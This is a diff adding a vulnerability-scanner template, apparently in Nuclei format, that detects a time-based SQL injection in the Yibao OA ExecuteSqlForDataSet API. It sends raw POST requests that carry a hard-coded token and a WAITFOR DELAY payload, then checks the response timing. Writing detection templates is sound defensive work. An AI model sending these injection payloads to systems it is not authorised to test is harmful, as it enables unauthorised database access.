@@ -1,0 +1,66 @@
+id: yi-bao-oa-system-executesqlfordataset-sqli
+info:
+  name: 易宝OA系统 ExecuteSqlForDataSet SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: '{{rand_int(5,9)}}'
+  t2: '{{to_number(t1) + 2}}'
+  t3: '{{rand_int(1,4)}}'
+  t4: '{{to_number(t3) + 2}}'
+
+http:
+  - raw:
+      - |
+        POST /api/system/ExecuteSqlForDataSet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        token=zxh&sql=;WAITFOR DELAY '0:0:{{t1}}'--&strParameters
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"message":"success"'
+          - '"is_succeed":true'
+          - '"data":{}'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
+  - raw:
+      - |
+        POST /api/system/ExecuteSqlForDataSet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        token=zxh&sql=;WAITFOR DELAY '0:0:{{t3}}'--&strParameters
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"message":"success"'
+          - '"is_succeed":true'
+          - '"data":{}'
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t3)"
+          - "duration < to_number(t4)"
